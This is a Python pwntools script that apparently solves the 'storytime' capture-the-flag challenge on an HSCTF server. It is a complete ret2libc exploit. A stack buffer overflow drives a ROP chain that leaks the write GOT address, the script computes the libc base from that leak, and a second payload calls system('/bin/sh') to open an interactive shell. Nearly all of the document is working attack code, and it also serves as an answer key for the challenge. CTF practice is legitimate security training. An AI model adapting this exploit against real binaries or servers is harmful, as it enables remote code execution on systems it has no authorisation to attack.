from pwn import *
import struct

# r = gdb.debug('./storytime')
r = remote('pwn.hsctf.com', 3333)

writegot = p64(0x601018)
writeplt = p64(0x4004a0)
poprdi = p64(0x0000000000400703)
poprsi = p64(0x0000000000400701)
entry = p64(0x4004d0)
one = p64(1)
eight = p64(8)

r.recvline()
r.recvline()
payload = b''
payload += b'A' * 48
payload += b'B' * 8
payload += poprdi
payload += one
payload += poprsi
payload += writegot
payload += writegot
payload += writeplt
payload += entry
r.sendline(payload)

leak = r.recv()[:6] + b'\x00\x00'

print(hex(struct.unpack('<Q', leak)[0]))


write_libc = 0x0f72b0
libc_base = struct.unpack('<Q', leak)[0] - write_libc
system = libc_base + 0x0000000000045390
binsh = libc_base + 0x18cd57
exit = libc_base + 0x000000000003a030

payload = b''
payload += b'A' * 48
payload += b'B' * 8
payload += poprdi
payload += p64(binsh)
payload += p64(system)
payload += p64(exit)

r.sendline(payload)
r.interactive()
